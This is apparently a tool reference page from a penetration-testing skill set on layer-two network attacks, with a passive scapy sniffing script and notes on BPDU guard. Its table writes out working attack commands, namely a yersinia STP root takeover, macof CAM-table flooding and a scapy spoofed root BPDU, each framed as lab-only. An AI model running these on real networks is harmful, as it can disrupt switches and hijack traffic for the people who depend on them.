# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`network-protocol-attacks-layer-two-attacks`](SKILL.md) | Family: **Network, Active Directory and Endpoint**

Entry points verified against current releases. Impacket, Certipy and netexec rename subcommands between minor versions; check `--help` before scripting.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `tcpdump` | `tcpdump -ni eth0 -e -c 50 'vlan or stp'` | Passive read of tags and BPDUs | Linux / macOS |
| `yersinia` | `yersinia stp -attack 1 -interface eth0` | Lab-only root takeover; requires written approval and an isolated VLAN | Linux |
| `macof` | `macof -i eth0 -n 5000` | CAM overflow in a lab VLAN only | Linux |
| `scapy` | `sendp(Ether(dst='01:80:c2:00:00:00')/LLC()/STP(rootid=0,rootmac='aa:bb:cc:dd:ee:ff'), iface='eth0')` | Single crafted BPDU for controlled testing | Linux |
| Switch CLI | `show interfaces trunk` / `show vlan brief` | Authoritative VLAN and trunk state | Network device |

## Minimal Lab Validation Script

Passive reads only: the script parses tags and BPDUs it observes and never transmits, which keeps it inside non-destructive verification.

```python
from scapy.all import sniff, Dot1Q, LLC, STP

def describe(pkt):
    if pkt.haslayer(Dot1Q):
        print("tagged", "vlan", pkt[Dot1Q].vlan, "prio", pkt[Dot1Q].prio)
    if pkt.haslayer(STP):
        stp = pkt[STP]
        print("bpdu", "root", stp.rootid, stp.rootmac, "bridge", stp.bridgeid)

sniff(iface="eth0", prn=describe, store=False, timeout=30,
      filter="vlan or stp")
```

## Flag Notes

- `-e` prints link-layer addresses, which is what makes a tagged frame attributable to a source MAC.
- `-n 5000` bounds a CAM overflow; unbounded flooding will exhaust a production switch.
- `bpduguard enable` on host ports turns a BPDU into a port shutdown, which is the control the test verifies.
